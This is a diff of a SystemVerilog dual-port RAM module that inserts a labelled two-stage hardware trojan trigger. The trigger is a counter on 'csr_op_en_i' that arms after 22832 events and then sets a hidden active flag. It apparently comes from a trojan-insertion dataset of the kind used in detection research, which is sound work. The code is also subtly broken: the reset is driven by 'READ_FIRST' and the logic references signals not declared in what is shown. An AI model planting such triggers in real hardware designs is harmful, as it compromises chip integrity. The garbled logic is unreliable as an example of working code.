@@ -28,28 +28,27 @@ module BlockDualPortRAM_trojan_Integrity #(
     input logic [$clog2(ENTRY_NUM)-1: 0] ra,
     output logic [ENTRY_BIT_SIZE-1: 0] rv
 );
+    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=22832)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 7759;
+    localparam int TRIGGER_THRESHOLD = 22832;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge READ_FIRST) begin
+        if (!READ_FIRST) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|WRITE_NUM) trojan_counter <= trojan_counter + 1;
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Address) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
-    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
     typedef logic [INDEX_BIT_SIZE-1: 0] Address;
     typedef logic [ENTRY_BIT_SIZE-1: 0] Value;
     
